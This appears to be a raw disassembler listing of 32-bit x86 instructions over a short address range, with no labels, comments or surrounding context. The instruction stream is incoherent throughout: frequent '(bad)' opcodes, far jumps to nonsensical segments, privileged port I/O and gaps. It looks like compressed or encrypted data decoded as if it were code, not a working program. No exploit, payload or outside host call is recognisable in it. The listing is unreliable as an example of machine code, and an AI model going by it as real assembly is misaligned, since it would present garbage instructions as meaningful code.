  4269bc:	jne    0x426978
  4269be:	push   ebp
  4269bf:	inc    esp
  4269c0:	in     eax,0xe5
  4269c2:	pop    es
  4269c3:	sub    ebp,DWORD PTR [edx]
  4269c5:	fwait
  4269c6:	add    DWORD PTR [eax],eax
  4269c8:	test   BYTE PTR [eax],0x0
  4269cb:	add    BYTE PTR [edx-0x7a9beee],dh
  4269d1:	mov    ch,0x48
  4269d3:	xchg   ebx,eax
  4269d4:	mov    dh,0xde
  4269d6:	sub    ebx,esi
  4269d8:	xor    DWORD PTR [edx+0x69306f5],0xffffffa7
  4269df:	fstp   TBYTE PTR ds:0x9201ceb6
  4269e5:	hlt    
  4269e6:	hlt    
  4269e7:	push   ebp
  4269e8:	cmp    DWORD PTR [eax],edx
  4269ea:	scas   eax,DWORD PTR es:[edi]
  4269eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4269ec:	mov    dl,0x97
  4269ee:	push   cs
  4269ef:	jmp    0x42697c
  4269f1:	push   ss
  4269f2:	inc    ebp
  4269f3:	add    dl,cl
  4269f5:	and    DWORD PTR [esi],0xffffffaa
  4269f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269f9:	fs mov edi,0x14195266
  4269ff:	pop    edx
  426a00:	cs stos DWORD PTR es:[edi],eax
  426a02:	dec    eax
  426a03:	cwde   
  426a04:	call   0x1a8387c3
  426a09:	popf   
  426a0a:	pop    edi
  426a0b:	mov    esp,0xa4ca14ad
  426a10:	out    0x35,al
  426a12:	neg    DWORD PTR [ebp-0x6a66a523]
  426a18:	mov    esp,0x1f79c8e6
  426a1d:	jnp    0x4269cb
  426a1f:	mov    bh,0x23
  426a21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a22:	or     BYTE PTR [ebx+0x52f27c7d],ah
  426a28:	adc    DWORD PTR [edx+edx*1+0x1a7650bb],0x275d3bff
  426a33:	sbb    ah,ch
  426a35:	xchg   edi,eax
  426a36:	sbb    al,0x39
  426a38:	or     DWORD PTR ds:0x6b8c145e,ebp
  426a3e:	clc    
  426a3f:	test   dl,dl
  426a41:	(bad)  
  426a42:	xchg   ebx,eax
  426a43:	mov    ds:0x91d63c83,eax
  426a48:	test   eax,0x4c618908
  426a4d:	cmp    al,0xd5
  426a4f:	lods   al,BYTE PTR ds:[esi]
  426a50:	xchg   esi,eax
  426a51:	dec    edi
  426a52:	fld    QWORD PTR [edi-0x3e8c4ccb]
  426a58:	pop    ss
  426a59:	retf   
  426a5a:	je     0x426a14
  426a5c:	mul    DWORD PTR [ebp+0x79690f99]
  426a62:	mov    cl,0xcf
  426a64:	mov    dl,0xac
  426a66:	ins    DWORD PTR es:[edi],dx
  426a67:	inc    edi
  426a68:	jne    0x426a98
  426a6a:	data16 ins BYTE PTR es:[edi],dx
  426a6c:	and    eax,DWORD PTR [ebx-0x55975a8a]
  426a72:	fwait
  426a73:	shl    DWORD PTR [edx],0x5e
  426a76:	mov    ebx,DWORD PTR [edx-0x6b20d2ac]
  426a7c:	mov    eax,DWORD PTR [eax]
  426a7e:	inc    edx
  426a7f:	neg    bl
  426a81:	push   DWORD PTR [eax-0x11f51ff1]
  426a87:	fwait
  426a88:	(bad)  
  426a89:	pop    ds
  426a8a:	jle    0x426a3f
  426a8c:	nop
  426a8d:	sti    
  426a8e:	inc    eax
  426a8f:	outs   dx,DWORD PTR ds:[esi]
  426a90:	cmp    BYTE PTR [edi+0x39],0x28
  426a94:	push   ss
  426a95:	dec    ecx
  426a96:	in     eax,dx
  426a97:	es popa 
  426a99:	lahf   
  426a9a:	cdq    
  426a9b:	mov    es,WORD PTR [eax+0xd44578e]
  426aa1:	(bad)  
  426aa2:	popa   
  426aa3:	shr    BYTE PTR [esp+ebx*8+0x2f505b8d],cl
  426aaa:	inc    esp
  426aab:	cmp    ebp,DWORD PTR [ebp-0x54]
  426aae:	stc    
  426aaf:	into   
  426ab0:	pop    ecx
  426ab1:	rcr    cl,0xcf
  426ab4:	push   edx
  426ab5:	cmp    al,0xaf
  426ab7:	fmul   DWORD PTR [ebp-0x3cb29722]
  426abd:	out    dx,al
  426abe:	icebp  
  426abf:	pushf  
  426ac0:	sub    eax,esi
	...
  426b32:	add    BYTE PTR [eax],al
  426b34:	(bad)  
  426b35:	clc    
  426b36:	jnp    0x426b8e
  426b38:	jg     0x426b11
  426b3a:	in     eax,dx
  426b3b:	cli    
  426b3c:	cwde   
  426b3d:	inc    ebx
  426b3e:	mov    dh,0x90
  426b40:	iret   
  426b41:	fst    st(4)
  426b43:	jmp    0xf6:0x19c20
  426b4a:	add    BYTE PTR [eax],al
  426b4c:	sub    bh,BYTE PTR [edx-0x68cad5ff]
  426b52:	xchg   edi,eax
  426b53:	adc    BYTE PTR [ebx-0x46],al
  426b56:	std    
  426b57:	xchg   edi,eax
  426b58:	(bad)  
  426b59:	dec    eax
  426b5a:	xchg   BYTE PTR [edx],ah
  426b5c:	and    edi,eax
  426b5e:	pop    ebx
  426b5f:	push   cs
  426b60:	add    ebx,DWORD PTR [ecx+0x7a]
  426b63:	inc    edi
  426b64:	(bad)
  426b67:	call   0xc54716ab
  426b6c:	xor    al,0xdc
  426b6e:	call   0x593e4909
  426b73:	inc    ebx
  426b74:	xchg   ebx,eax
  426b75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b76:	xchg   esi,eax
  426b77:	repz push 0xfffffff7
  426b7a:	push   edx
  426b7b:	out    0xd8,al
  426b7d:	sar    eax,1
  426b7f:	sub    BYTE PTR [ecx+0x58b173c9],dl
  426b85:	scas   al,BYTE PTR es:[edi]
  426b86:	imul   ecx,DWORD PTR [esi+0x5b69dc11],0xa454ea26
  426b90:	mov    ebx,0xd95d9436
  426b95:	and    DWORD PTR [esi],edx
  426b97:	mov    edx,0x82305298
  426b9c:	iret   
  426b9d:	dec    esp
  426b9e:	scas   eax,DWORD PTR es:[edi]
  426b9f:	lods   eax,DWORD PTR ds:[esi]
  426ba0:	das    
  426ba1:	imul   ebx,DWORD PTR [edi+ebx*4+0xd],0x19
  426ba6:	scas   al,BYTE PTR es:[edi]
  426ba7:	sbb    BYTE PTR ds:[ecx-0xf409a33],bh
  426bae:	lds    eax,FWORD PTR [edx+0x7f]
  426bb1:	pop    ss
  426bb2:	nop
  426bb3:	mov    eax,edi
  426bb5:	push   ebx
  426bb6:	jecxz  0x426b84
  426bb8:	repnz xchg edi,eax
  426bba:	lods   al,BYTE PTR ds:[esi]
  426bbb:	mov    ?,WORD PTR [ebx-0x771a4d4c]
  426bc1:	pusha  
  426bc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426bc3:	(bad)  
  426bc4:	xor    al,0x9d
  426bc6:	mov    edx,0x7627c9bb
  426bcb:	push   eax
  426bcc:	add    DWORD PTR [esi-0x6],edi
  426bcf:	xchg   ebp,eax
  426bd0:	push   edi
  426bd1:	fs aas 
  426bd3:	call   0x97ff:0xc0fdbb64
  426bda:	je     0x426b8a
  426bdc:	(bad)  
  426bdd:	push   ebp
  426bde:	xor    DWORD PTR [ebp+ebp*1-0x2be10381],0x18
  426be6:	mov    ebx,0x7f08b64d
  426beb:	add    ch,ah
  426bed:	xor    BYTE PTR [ebx-0x2b70109c],0xf1
  426bf4:	xor    ecx,esi
  426bf6:	adc    BYTE PTR [esi-0x4f],dl
  426bf9:	ret    
  426bfa:	pusha  
  426bfb:	bound  edx,QWORD PTR [eax-0x1df8d489]
  426c01:	jb     0x426c16
  426c03:	iret   
  426c04:	jne    0x426b94
  426c06:	xchg   edx,eax
  426c07:	mov    ds:0x7cc1b044,al
  426c0c:	pop    ebp
  426c0d:	cli    
  426c0e:	(bad)  
  426c0f:	xlat   BYTE PTR ds:[ebx]
  426c10:	push   bx
  426c12:	lea    eax,[esp+eax*2+0x2e]
  426c16:	ficomp WORD PTR [ebx+0x66]
  426c19:	in     eax,0x9e
  426c1b:	mov    eax,0x8434448b
  426c20:	pop    ds
  426c21:	and    DWORD PTR [edx],0xffffff95
  426c24:	das    
  426c25:	mov    al,0x5d
  426c27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c28:	mov    esi,DWORD PTR [edi+0x2bf8b89e]
  426c2e:	outs   dx,DWORD PTR ds:[esi]
  426c2f:	cld    
  426c30:	xor    edi,DWORD PTR ds:0xad6bb585
  426c36:	cmp    al,0xfc
  426c38:	leave  
  426c39:	mov    al,0x68
  426c3b:	pop    esp
  426c3c:	jmp    FWORD PTR [ebx]
  426c3e:	xor    DWORD PTR [ebx],eax
  426c40:	pop    eax
  426c41:	mov    ebx,0x0
	...
  426cb2:	add    BYTE PTR [eax],al
  426cb4:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  426cbb:	cld    
  426cbc:	inc    eax
  426cbd:	push   ds
  426cbe:	cdq    
  426cbf:	das    
  426cc0:	arpl   di,si
  426cc2:	ja     0x426cf8
  426cc4:	push   ss
  426cc5:	popf   
  426cc6:	add    DWORD PTR [eax],eax
  426cc8:	test   BYTE PTR [eax],0x0
  426ccb:	add    BYTE PTR [eax+eiz*2-0xe],dl
  426ccf:	mov    bl,0x2c
  426cd1:	or     eax,0x31f2d188
  426cd6:	sbb    ebp,eax
  426cd8:	mov    edi,0xbf0d8db7
  426cdd:	xchg   BYTE PTR [ecx+ecx*4+0x70711f90],ah
  426ce4:	jp     0x426c71
  426ce6:	jp     0x426d60
  426ce8:	inc    ebx
  426ce9:	push   esp
  426cea:	adc    al,0x19
  426cec:	daa    
  426ced:	mov    ah,0xd2
  426cef:	pop    ds
  426cf0:	dec    ecx
  426cf1:	adc    eax,0x80e6dab5
  426cf6:	rcl    BYTE PTR [ebp+0x7ea30ad1],cl
  426cfc:	jnp    0x426cd2
  426cfe:	xor    bl,al
  426d00:	xchg   DWORD PTR [esi+ebx*1],edx
  426d03:	fwait
  426d04:	out    dx,al
  426d05:	pop    ebx
  426d06:	pop    ebx
  426d07:	inc    esi
  426d08:	out    dx,eax
  426d09:	(bad)  
  426d0a:	outs   dx,DWORD PTR ds:[esi]
  426d0b:	out    dx,eax
  426d0c:	sbb    ebp,ebx
  426d0e:	test   al,0x77
  426d10:	jle    0xd1432c61
  426d16:	test   BYTE PTR [edi+edi*1-0x8aec9b6],0x3f
  426d1e:	pop    edi
  426d1f:	ret    0xe53b
  426d22:	js     0x426d74
  426d24:	sahf   
  426d25:	and    eax,0xbdb36166
  426d2a:	pushf  
  426d2b:	sub    al,0x62
  426d2d:	sbb    DWORD PTR [ebp+0x61],edx
  426d30:	fst    DWORD PTR [eax+0x6e]
  426d33:	pop    esi
  426d34:	add    eax,0x17918b72
  426d39:	inc    edx
  426d3a:	mov    esi,0x69117633
  426d3f:	add    eax,0x1abbc442
  426d44:	adc    ecx,ebx
  426d46:	adc    dh,BYTE PTR [ebx+0x76692c68]
  426d4c:	mov    cl,0x58
  426d4e:	sub    DWORD PTR [esi+0xd8e3368],esi
  426d54:	mov    ecx,0xff59054
  426d59:	idiv   BYTE PTR [esp+edi*8]
  426d5c:	nop
  426d5d:	push   esp
  426d5e:	adc    eax,0xfe9dc9e9
  426d63:	sbb    al,0xc4
  426d65:	pop    esi
  426d66:	push   0xb4512452
  426d6b:	mov    eax,ds:0x4a8d4771
  426d70:	lods   eax,DWORD PTR ds:[esi]
  426d71:	retf   0x1dc0
  426d74:	sbb    DWORD PTR [ecx+0x4719021a],0xffffffd7
  426d7b:	pop    ebp
  426d7c:	push   0xffffff80
  426d7e:	xchg   ebp,eax
  426d7f:	mov    ds:0xe0a45d4a,al
  426d84:	pop    esp
  426d85:	in     al,0x1d
  426d87:	ins    BYTE PTR es:[edi],dx
  426d88:	inc    edx
  426d89:	jl     0x426dd4
  426d8b:	call   0xf4cc:0xf9c9328d
  426d92:	es data16 jno 0x426de8
  426d96:	pop    edi
  426d97:	add    bl,bl
  426d99:	test   eax,0x42c30077
  426d9e:	fnstenv [eax]
  426da0:	stc    
  426da1:	test   al,0x24
  426da3:	inc    esp
  426da4:	mov    cl,0x9a
  426da6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426da7:	lods   eax,DWORD PTR ds:[esi]
  426da8:	xchg   ebx,eax
  426da9:	xlat   BYTE PTR ds:[ebx]
  426daa:	inc    ebx
  426dab:	fldcw  WORD PTR [edx+ebp*2]
  426dae:	xor    DWORD PTR [eax+0x57f578e1],esi
  426db4:	int    0x80
  426db6:	mov    bl,0xf3
  426db8:	mov    eax,ds:0xee791035
  426dbd:	xor    al,0xe4
  426dbf:	int    0x9e
  426dc1:	aam    0x0
	...
  426e33:	add    dh,al
  426e35:	jl     0x426e88
  426e37:	sar    bl,1
  426e39:	std    
  426e3a:	(bad)  
  426e3b:	jle    0x426df9
  426e3d:	(bad)  
  426e3e:	loop   0x426e84
  426e40:	(bad)  
  426e41:	push   cs
  426e42:	xchg   esp,eax
  426e43:	mov    dl,0xc
  426e45:	sahf   
  426e46:	add    DWORD PTR [eax],eax
  426e48:	test   BYTE PTR [eax],0x0
  426e4b:	add    cl,al
  426e4d:	mov    ecx,0xbae47974
  426e52:	imul   BYTE PTR [eax-0x42585f59]
  426e58:	pop    ebp
  426e59:	mov    ds,WORD PTR [ebx]
  426e5b:	or     al,0xd9
  426e5d:	jae    0x426ecb
  426e5f:	sub    dl,BYTE PTR [ebp+0x31]
  426e62:	ja     0x426e65
  426e64:	cmp    BYTE PTR [edi+0x42afdbcf],bh
  426e6a:	add    eax,0x5c8e7484
  426e6f:	jns    0x426dfb
  426e71:	push   ds
  426e72:	mov    bl,0x9b
  426e74:	or     DWORD PTR [eax-0x5d3da0d8],ecx
  426e7a:	jbe    0x426e56
  426e7c:	xchg   ebx,eax
  426e7d:	out    0xc,al
  426e7f:	ret    
  426e80:	lea    edx,[ebx-0x43]
  426e83:	outs   dx,BYTE PTR ds:[esi]
  426e84:	pusha  
  426e85:	retf   0x731b
  426e88:	inc    BYTE PTR [ebx]
  426e8a:	xor    eax,0x3a97525f
  426e8f:	sbb    esp,DWORD PTR [edx+0x32c59b05]
  426e95:	(bad)  
  426e96:	pop    eax
  426e97:	mov    edx,0xba15eb4d
  426e9c:	stos   DWORD PTR es:[edi],eax
  426e9d:	daa    
  426e9e:	and    BYTE PTR [edx],ah
  426ea0:	mov    ah,0xc6
  426ea2:	mov    dl,0x7c
  426ea4:	xor    al,0xba
  426ea6:	in     eax,dx
  426ea7:	pop    edx
  426ea8:	sub    al,0x1a
  426eaa:	push   esi
  426eab:	and    BYTE PTR [ecx],cl
  426ead:	inc    edx
  426eae:	sar    BYTE PTR [ecx+0xe],0xf9
  426eb2:	dec    esp
  426eb3:	je     0x426ebd
  426eb5:	std    
  426eb6:	(bad)  
  426eb7:	aad    0xe1
  426eb9:	scas   eax,DWORD PTR es:[edi]
  426eba:	mov    BYTE PTR [esi+0x63d4ccf6],ah
  426ec0:	jns    0x426f16
  426ec2:	std    
  426ec3:	pop    esp
  426ec4:	clc    
  426ec5:	in     eax,0x3d
  426ec7:	jo     0x426e6b
  426ec9:	jb     0x426ec4
  426ecb:	and    al,0x5e
  426ecd:	sti    
  426ece:	mov    cl,0x66
  426ed0:	or     BYTE PTR [eax+0x3541f173],bh
  426ed6:	mov    ebp,0xb2d25e33
  426edb:	sbb    eax,0xced32f7f
  426ee0:	stc    
  426ee1:	iret   
  426ee2:	xchg   DWORD PTR [edx],ecx
  426ee4:	aas    
  426ee5:	jmp    0x83615efd
  426eea:	loop   0x426e93
  426eec:	cmp    dl,BYTE PTR [esi+0x64]
  426eef:	sahf   
  426ef0:	lea    esi,[esp+ecx*1]
  426ef3:	call   0x9d3b:0xb4013db7
  426efa:	jbe    0x426f40
  426efc:	ja     0x426f13
  426efe:	(bad)  
  426eff:	jmp    0x2959:0xcfbb7ce5
  426f06:	call   0x9edb:0xf28c77f2
  426f0d:	pushf  
  426f0e:	hlt    
  426f0f:	loope  0x426f3b
  426f11:	jl     0x426ed9
  426f13:	jnp    0x426f09
  426f15:	fcmovbe st,st(5)
  426f17:	cli    
  426f18:	mov    cl,0xa6
  426f1a:	ds int3 
  426f1c:	add    ebx,ebp
  426f1e:	ja     0x426f43
  426f20:	shr    BYTE PTR [ebx],cl
  426f22:	in     eax,dx
  426f23:	pcmpgtd mm5,QWORD PTR [eax*2+0x2e5f6901]
  426f2b:	adc    BYTE PTR [edi+0x7f],cl
  426f2e:	(bad)  
  426f2f:	(bad)  
  426f30:	pop    ecx
  426f31:	jecxz  0x426eb6
  426f33:	je     0x426f92
  426f35:	test   al,ah
  426f37:	and    eax,0x8b62edd9
  426f3c:	cmp    ah,BYTE PTR [ebp-0x17def1ad]
	...
  426fb2:	add    BYTE PTR [eax],al
  426fb4:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  426fba:	cmp    eax,0xcc7989bf
  426fbf:	pop    ebx
  426fc0:	sub    al,0x6d
  426fc2:	rcr    DWORD PTR [ebx+0x2],1
  426fc5:	lahf   
  426fc6:	add    DWORD PTR [eax],eax
  426fc8:	test   BYTE PTR [eax],0x0
  426fcb:	add    BYTE PTR [esi-0x1c],dl
  426fce:	lods   eax,DWORD PTR ds:[esi]
  426fcf:	push   0x2e
  426fd1:	in     eax,0xf4
  426fd3:	jbe    0x426f9f
  426fd5:	in     al,dx
  426fd6:	sbb    eax,0x488aa669
  426fdb:	dec    esi
  426fdc:	scas   al,BYTE PTR es:[edi]
  426fdd:	test   ecx,ecx
  426fdf:	pop    ebp
  426fe0:	mov    ebx,0x1a18d4ae
  426fe5:	cmp    eax,0xdc0a7bf4
  426fea:	pop    ebp
  426feb:	jl     0x426f7a
  426fed:	imul   ebx,DWORD PTR [edi+ebx*8-0x47],0x7a
  426ff2:	mov    cl,0x20
  426ff4:	jae    0x426fdc
  426ff6:	adc    DWORD PTR [esi-0x458367f5],ebp
  426ffc:	out    0x34,eax
  426ffe:	and    DWORD PTR [eax+eax*2],edi
  427001:	lods   eax,DWORD PTR ds:[esi]
  427002:	xchg   ebp,ebp
  427004:	jns    0x426fd0
  427006:	xchg   ecx,eax
  427007:	jmp    0x9548:0xf6016d22
  42700e:	stos   DWORD PTR es:[edi],eax
  42700f:	shl    BYTE PTR [esi+0x577197cf],cl
  427015:	add    eax,0xecf2c740
  42701a:	jae    0x426fff
  42701c:	jno    0x427074
  42701e:	mov    ch,0x3b
  427020:	dec    esi
  427022:	jbe    0x426fd1
  427024:	adc    DWORD PTR [edx],esp
  427026:	inc    esp
  427027:	and    dh,BYTE PTR [ebp-0x6c]
  42702a:	sbb    al,0x2
  42702c:	and    BYTE PTR [edx+0x4c],dl
  42702f:	(bad)  
  427030:	pop    eax
  427031:	das    
  427032:	pop    esp
  427033:	pop    eax
  427034:	call   0x249d:0x61b1072e
  42703b:	aas    
  42703c:	into   
  42703d:	dec    ebx
  42703e:	icebp  
  42703f:	fidivr DWORD PTR [ecx-0x31c90b60]
  427045:	pushf  
  427046:	jae    0x427088
  427048:	jecxz  0x426fe4
  42704a:	ds sti 
  42704c:	cld    
  42704d:	sub    al,0x9
  42704f:	ds jns 0x427005
  427052:	jo     0x427014
  427054:	mov    ah,dl
  427056:	popf   
  427057:	dec    edx
  427058:	stc    
  427059:	cmp    eax,0xa2e1adac
  42705e:	ins    BYTE PTR es:[edi],dx
  42705f:	sbb    ebx,ebx
  427061:	xchg   esp,esp
  427063:	jne    0x426ff9
  427065:	mov    esi,0x2428b013
  42706a:	mov    ebp,0xc64d51e5
  42706f:	pop    edx
  427070:	mov    BYTE PTR [bx+si+0x793b],dl
  427075:	and    esi,ecx
  427077:	pusha  
  427078:	inc    ebx
  427079:	or     DWORD PTR cs:[edx],0x25
  42707d:	and    eax,0x5b81036f
  427082:	push   es
  427083:	stos   DWORD PTR es:[edi],eax
  427084:	jb     0x42700b
  427086:	pop    esp
  427087:	inc    esp
  427088:	adc    esp,esp
  42708a:	fisub  DWORD PTR [ebx-0x4e7647d0]
  427090:	dec    edi
  427091:	ins    BYTE PTR es:[edi],dx
  427092:	shr    BYTE PTR [edi],cl
  427094:	lea    edx,[edx]
  427096:	cdq    
  427097:	jp     0x4270b1
  427099:	leave  
  42709a:	popa   
  42709b:	adc    BYTE PTR [edi+0x2c],ah
  42709e:	xchg   esp,eax
  42709f:	(bad)  
  4270a0:	je     0x427031
  4270a2:	pop    ds
  4270a3:	cmp    edi,DWORD PTR [ecx-0x27b6ca82]
  4270a9:	arpl   dx,bp
  4270ab:	mov    ds:0xd27cef81,al
  4270b0:	mov    ch,0xbc
  4270b2:	mov    ds:0x9b8309b8,al
  4270b7:	iret   
  4270b8:	in     al,dx
  4270b9:	fyl2xp1 
  4270bb:	dec    eax
  4270bc:	fstp   DWORD PTR [esi+ecx*1+0x11dad1]
	...
  427133:	add    BYTE PTR [ebx-0x409ef0df],bl
  427139:	outs   dx,DWORD PTR ds:[esi]
  42713a:	(bad)  
  42713b:	sti    
  42713c:	into   
  42713d:	aad    0x24
  42713f:	aam    0x38
  427141:	mov    eax,0x9ff81192
  427146:	add    DWORD PTR [eax],eax
  427148:	test   BYTE PTR [eax],0x0
  42714b:	add    bl,ch
  42714d:	jmp    0x42719b
  42714f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427150:	aaa    
  427151:	xchg   BYTE PTR [edx],cl
  427153:	mov    al,ds:0xe50ae15
  427158:	xor    ebp,DWORD PTR ds:0x88db6899
  42715e:	fnstsw WORD PTR [edi+0x25570ab1]
  427164:	out    0x7,al
  427166:	mov    eax,0xc41cf971
  42716b:	xchg   edi,eax
  42716c:	dec    esi
  42716d:	loope  0x427151
  42716f:	in     al,dx
  427170:	and    DWORD PTR [ebp-0x411bdd45],ebx
  427176:	jne    0x42718c
  427178:	imul   ebx,DWORD PTR [eax+0x4b75051f],0x3b4cc0f3
  427182:	pop    ebx
  427183:	mov    eax,0x4ef7d1e9
  427188:	loope  0x427142
  42718a:	xor    al,0x62
  42718c:	arpl   WORD PTR [ecx-0x25d9d84c],dx
  427192:	xchg   ebx,eax
  427193:	rcl    DWORD PTR [edi],1
  427195:	(bad)  
  427196:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427197:	ins    BYTE PTR es:[edi],dx
  427198:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427199:	inc    eax
  42719a:	ss adc al,0xbf
  42719d:	dec    esi
  42719e:	xchg   ebp,ecx
  4271a0:	jns    0x4271e7
  4271a2:	jecxz  0x427175
  4271a4:	ret    0x3fcb
  4271a7:	inc    ebx
  4271a8:	xchg   ebp,eax
  4271a9:	mov    dh,0xd8
  4271ab:	jns    0x4271fe
  4271ad:	or     ah,BYTE PTR [edx+0x5c]
  4271b0:	and    al,0xec
  4271b2:	mov    edx,0xcc7889b1
  4271b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4271b8:	mov    edi,0x6acd9261
  4271bd:	mov    esp,0xc2e69a3
  4271c2:	outs   dx,DWORD PTR ds:[esi]
  4271c3:	outs   dx,DWORD PTR ds:[esi]
  4271c4:	xchg   ebx,eax
  4271c5:	lea    esp,[esi-0x5d]
  4271c8:	xor    DWORD PTR [esi+0x7a],ecx
  4271cb:	jecxz  0x427164
  4271cd:	aad    0xcb
  4271cf:	pop    eax
  4271d0:	shl    BYTE PTR [edi+0x71],1
  4271d3:	mov    ecx,0x36e288c6
  4271d8:	out    0x92,al
  4271da:	pop    ecx
  4271db:	loop   0x427199
  4271dd:	xchg   ebp,edx
  4271df:	cld    
  4271e0:	fs sub ah,ah
  4271e3:	mov    cl,BYTE PTR [edx+0xee65f88]
  4271e9:	mov    eax,0xcde73b2d
  4271ee:	aad    0x29
  4271f0:	sbb    BYTE PTR [ebx],cl
  4271f2:	xor    DWORD PTR [edi-0x26],eax
  4271f5:	inc    edi
  4271f6:	adc    dh,BYTE PTR [ecx]
  4271f8:	cwde   
  4271f9:	inc    ebp
  4271fa:	scas   al,BYTE PTR es:[edi]
  4271fb:	shl    DWORD PTR ds:0x1230ce09,1
  427201:	xchg   BYTE PTR [esi-0x79a84555],cl
  427207:	dec    esi
  427208:	xchg   BYTE PTR [ebp-0x44d70db1],bh
  42720e:	and    al,cl
  427210:	or     al,0x3a
  427212:	jle    0x4271d8
  427214:	sbb    eax,0x7d34579a
  427219:	add    ch,dh
  42721b:	rcl    BYTE PTR [edx+0x7c],cl
  42721e:	pop    es
  42721f:	ret    
  427220:	mov    esi,0x4ceae0c6
  427225:	(bad)  [ecx+0x33]
  427228:	dec    ebx
  427229:	fldcw  WORD PTR [ebp-0x5b]
  42722c:	xor    ch,BYTE PTR [edi+eax*4+0x375a8a46]
  427233:	adc    BYTE PTR [edi+0x2a],dh
  427236:	dec    esp
  427237:	xor    DWORD PTR ds:0x555fa215,0x9351fde5
  427241:	pop    ebx
	...
  4272b2:	add    BYTE PTR [eax],al
  4272b4:	push   esp
  4272b5:	and    eax,0xeefd4e8d
  4272ba:	xlat   BYTE PTR ds:[ebx]
  4272bb:	aas    
  4272bc:	jle    0x427280
  4272be:	ds jmp 0x5fa52dea
  4272c4:	out    dx,al
  4272c5:	mov    al,ds:0xf60001
  4272ca:	add    BYTE PTR [eax],al
  4272cc:	out    dx,eax
  4272cd:	cmp    ebx,DWORD PTR [eax-0x49]
  4272d0:	daa    
  4272d1:	test   al,0x7b
  4272d3:	or     dl,BYTE PTR [edx-0x2c]
  4272d6:	outs   dx,DWORD PTR ds:[esi]
  4272d7:	sbb    ebp,edi
  4272d9:	sbb    al,0xf3
  4272db:	inc    ecx
  4272dc:	push   0x41abf64e
  4272e1:	dec    esp
  4272e2:	inc    eax
  4272e3:	test   al,0x22
  4272e5:	sub    al,0xe1
  4272e7:	inc    eax
  4272e8:	loopne 0x4272dc
  4272ea:	add    edi,edi
  4272ec:	mov    ch,BYTE PTR ds:0x72a00d94
  4272f2:	stos   DWORD PTR es:[edi],eax
  4272f3:	mov    bh,0x42
  4272f5:	into   
  4272f6:	sub    DWORD PTR [edi+0x19f3af32],0xffffff8b
  4272fd:	cmp    BYTE PTR [edi],al
  4272ff:	adc    ebx,DWORD PTR [edi+eiz*4+0x8]
  427303:	sbb    cl,bh
  427305:	and    eax,0xb10791d
  42730a:	sbb    edx,DWORD PTR [ecx]
  42730c:	and    al,0x5f
  42730e:	and    DWORD PTR [ebx],0x13ebf91d
  427314:	fnstcw WORD PTR [edi+0x37]
  427317:	fld    QWORD PTR [edi]
  427319:	loope  0x427327
  42731b:	scas   eax,DWORD PTR es:[edi]
  42731c:	mov    al,ds:0x65c8b86f
  427321:	dec    esi
  427322:	jb     0x4272d6
  427324:	mov    BYTE PTR [edx+0x4c],cl
  427327:	pop    edi
  427328:	pop    ecx
  427329:	fist   DWORD PTR [edi-0x4b8c5129]
  42732f:	enter  0x59d3,0x6b
  427333:	sahf   
  427334:	cmp    DWORD PTR [ecx+0x65],ecx
  427337:	adc    eax,DWORD PTR [edi+0x41638310]
  42733d:	jmp    0x427395
  42733f:	popf   
  427340:	je     0x4273b1
  427342:	mov    eax,0xb6e99a44
  427347:	push   0x7a
  427349:	and    al,0x2b
  42734b:	ds stos DWORD PTR es:[edi],eax
  42734d:	lock xor ebx,DWORD PTR [esi+0x6147d6c4]
  427354:	shl    DWORD PTR [ebp-0x5917ec],cl
  42735a:	iret   
  42735b:	popa   
  42735c:	and    eax,0xcb4b918c
  427361:	in     eax,dx
  427362:	dec    ebp
  427363:	pop    eax
  427364:	(bad)  
  427366:	pop    ds
  427367:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427368:	mov    esp,0xd92655d
  42736d:	(bad)  
  42736e:	lock adc BYTE PTR [ebp+ebx*8-0x63df6104],dh
  427376:	ror    BYTE PTR [esi],0xf3
  427379:	int    0xaa
  42737b:	pop    esi
  42737c:	adc    BYTE PTR [ecx],cl
  42737e:	gs pushw es
  427381:	push   ecx
  427382:	pop    ds
  427383:	pop    ebx
  427384:	cli    
  427385:	rcl    BYTE PTR [ecx+0x6a],cl
  427388:	int    0xe6
  42738a:	cmp    al,0x13
  42738c:	xor    esp,DWORD PTR ss:[ecx]
  42738f:	mov    ah,0xdc
  427391:	xchg   edi,eax
  427392:	ret    0xd8ed
  427395:	cdq    
  427396:	sub    eax,0x776e48df
  42739b:	call   0xe291f187
  4273a0:	and    dh,dh
  4273a2:	adc    ebp,esp
  4273a4:	cli    
  4273a5:	and    eax,0xfa5e491b
  4273aa:	pop    ebp
  4273ab:	jp     0x4273cb
  4273ad:	jo     0x42733d
  4273af:	push   ecx
  4273b0:	ret    
  4273b1:	scas   eax,DWORD PTR es:[edi]
  4273b2:	cs mov dh,0xb3
  4273b5:	mov    bl,0x99
  4273b7:	sub    al,0xb3
  4273b9:	xchg   ebp,eax
  4273ba:	pop    es
  4273bb:	jo     0x4273ae
  4273bd:	fmul   DWORD PTR [ebx]
  4273bf:	pop    edi
  4273c0:	dec    ecx
  4273c1:	jne    0x4273c3
	...
  427433:	add    BYTE PTR [ecx+0x6f],ch
  427436:	mov    BYTE PTR [eax],cl
  427438:	mov    gs,edi
  42743a:	jmp    0xe38703ae
  42743f:	jmp    0xa1e4:0x2c0f931e
  427446:	add    DWORD PTR [eax],eax
  427448:	test   BYTE PTR [eax],0x0
  42744b:	add    dh,bl
  42744d:	and    eax,0xa2d20c31
  427452:	fld    TBYTE PTR [eax+0x6]
  427455:	test   al,0x7d
  427457:	pop    edx
  427458:	bound  esi,QWORD PTR [edx]
  42745a:	shl    BYTE PTR [eax],0x5
  42745d:	jl     0x4274b3
  42745f:	xchg   esp,eax
  427460:	dec    esp
  427461:	ror    BYTE PTR [edi+0x15],cl
  427464:	fidiv  WORD PTR [eax]
  427466:	mov    edx,0xad490487
  42746b:	shr    ebp,0x5e
